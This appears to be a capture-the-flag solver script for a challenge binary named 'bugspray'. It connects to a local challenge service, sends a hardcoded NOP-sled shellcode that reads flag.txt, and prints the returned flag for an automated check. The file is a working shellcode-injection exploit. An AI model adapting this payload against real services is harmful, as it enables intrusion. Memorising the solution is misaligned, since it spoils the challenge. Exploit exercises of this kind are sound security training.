from pwn import *
import os

# binary = args.BIN
binary = '.build/bugspray' if os.path.exists('.build/bugspray') else 'bugspray'

# context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
break *0x40108b
continue
'''

def start():
	host = os.environ.get('HOST', '127.0.0.1')
	port = int(os.environ.get('PORT', 23004))
	return remote(host, port)
    # if args.GDB:
    #     return gdb.debug(e.path, gdbscript=gs)
    # elif args.REMOTE:
    #     return remote('127.0.0.1',31337)
    # else:
    #     return process(e.path)

p = start()

# Original payload: NOP sled + shellcraft.cat('flag.txt') padded to 100-32 bytes:
#   sc = asm(shellcraft.cat('flag.txt'))
#   chain = (100-32-len(sc))*asm(shellcraft.nop()) + sc
# The bytes are hardcoded below so the solver needs no runtime assembler (the
# `pwnmake check` container has pwntools but no cpp/binutils). Regenerate with the
# two lines above (amd64) if the payload ever changes.
chain = bytes.fromhex(
    "9090909090909090909090909090909090909090909090906a01fe0c2448b8"
    "666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a2858"
    "6a015f990f05"
)
p.sendline(chain)

# The shellcode runs cat('flag.txt'), so the flag comes straight back over the
# socket. Print it instead of going interactive so `pwnmake check` can verify it.
print(p.recvall(timeout=5).decode(errors='replace'))
